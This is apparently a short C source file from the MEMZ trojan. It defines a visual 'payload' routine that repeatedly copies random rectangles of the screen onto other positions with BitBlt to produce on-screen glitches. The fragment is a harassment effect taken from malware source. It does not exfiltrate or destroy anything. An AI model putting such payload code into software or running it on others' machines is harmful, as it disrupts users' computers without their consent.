#include "../MEMZ.h"

PAYLOADFUNCTIONVISUAL(payloadScreenGlitches) {
	PAYLOADHEAD

	int x1 = random() % (w - 400);
	int y1 = random() % (h - 400);
	int x2 = random() % (w - 400);
	int y2 = random() % (h - 400);
	int width = random() % 400;
	int height = random() % 400;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}